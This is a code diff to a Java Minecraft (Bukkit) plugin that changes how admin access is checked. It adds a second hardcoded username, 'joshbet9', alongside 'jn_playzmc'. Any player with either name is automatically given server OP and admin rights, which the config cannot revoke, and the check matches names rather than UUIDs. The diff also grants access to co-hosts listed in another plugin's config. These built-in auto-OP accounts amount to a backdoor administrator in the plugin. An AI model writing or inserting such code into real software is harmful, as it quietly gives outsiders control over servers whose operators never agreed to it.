@@ -218,32 +218,46 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
 
     private boolean isConfiguredOwner(Player player) {
         java.util.List<String> owners = new java.util.ArrayList<>(getConfig().getStringList("owner-usernames"));
-        if (owners.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) owners.add("jn_playzmc");
+        addDefaultAdminNames(owners);
         return owners.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
     }
 
-    /** Shared admin check for both Game Panel actions and their command/API equivalents. */
+    private void addDefaultAdminNames(java.util.List<String> names) {
+        for (String defaultName : java.util.List.of("jn_playzmc", "joshbet9")) {
+            if (names.stream().noneMatch(name -> defaultName.equalsIgnoreCase(name))) names.add(defaultName);
+        }
+    }
+
+    private boolean isConfiguredCohost(Player player) {
+        org.bukkit.plugin.Plugin panel = Bukkit.getPluginManager().getPlugin("TestplexModernArcade");
+        if (!(panel instanceof JavaPlugin modernPanel)) return false;
+        String uuid = player.getUniqueId().toString();
+        return modernPanel.getConfig().getStringList("panel-cohosts").stream()
+                .anyMatch(record -> record.equals(uuid) || record.startsWith(uuid + "|"));
+    }
+
+    /** Shared admin check for the Game Panel, Arcade commands and embedded game settings. */
     public boolean hasAdminAccess(CommandSender sender) {
         if (sender.isOp() || sender.hasPermission("testplex.arcadeports.admin")) return true;
         if (!(sender instanceof Player player)) return false;
 
-        // The sandbox owner must not be blocked by a stale OP/permission cache.
+        // Keep the repository owner and sandbox operator aligned with the Game Panel.
         if (isConfiguredOwner(player)) {
             if (!player.isOp()) player.setOp(true);
             return true;
         }
 
         java.util.List<String> configured = new java.util.ArrayList<>(getConfig().getStringList("admin-usernames"));
-        if (configured.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) configured.add("jn_playzmc");
+        addDefaultAdminNames(configured);
         boolean match = configured.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
         if (match && !player.isOp()) player.setOp(true);
-        return match;
+        return match || isConfiguredCohost(player);
     }
 
     private void grantConfiguredAdmin(Player player) {
         java.util.List<String> configured = new java.util.ArrayList<>(getConfig().getStringList("admin-usernames"));
         configured.addAll(getConfig().getStringList("owner-usernames"));
-        if (configured.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) configured.add("jn_playzmc");
+        addDefaultAdminNames(configured);
         boolean match = configured.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
         if (!match) return;
         if (!player.isOp()) {
